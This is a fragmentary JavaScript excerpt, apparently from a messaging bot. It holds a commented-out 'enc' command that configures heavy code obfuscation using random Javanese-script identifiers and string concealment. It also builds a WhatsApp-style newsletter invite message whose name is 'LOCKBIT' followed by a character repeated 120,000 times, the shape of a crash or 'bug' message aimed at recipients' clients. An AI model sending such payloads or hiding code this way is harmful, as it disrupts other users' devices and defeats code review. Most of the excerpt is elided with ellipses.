...
/*bot.command("enc", async (ctx) => {
    ...
    identifierGenerator: function () {
        ...
        const originalString = aksaraJawa.join("");

        function removeUnwantedChars(input) {
            return input.replace(/[^ꦲ-ꦔ]/g, '');
        }

        function randomString(length) {
            let result = '';
            for (let i = 0; i < length; i++) {
                result += aksaraJawa[Math.floor(Math.random() * aksaraJawa.length)];
            }
            return result;
        }
    ...
    renameGlobals: true,
    stringEncoding: true,
    stringSplitting: 0.5, // Membagi string menjadi bagian-bagian
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 0.5 },
    stack: true,
                    ...
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "𝙇𝙊𝘾𝙆𝘽𝙄𝙏ી " + "ી".repeat(120000),
                                jpegThumbnail: "",
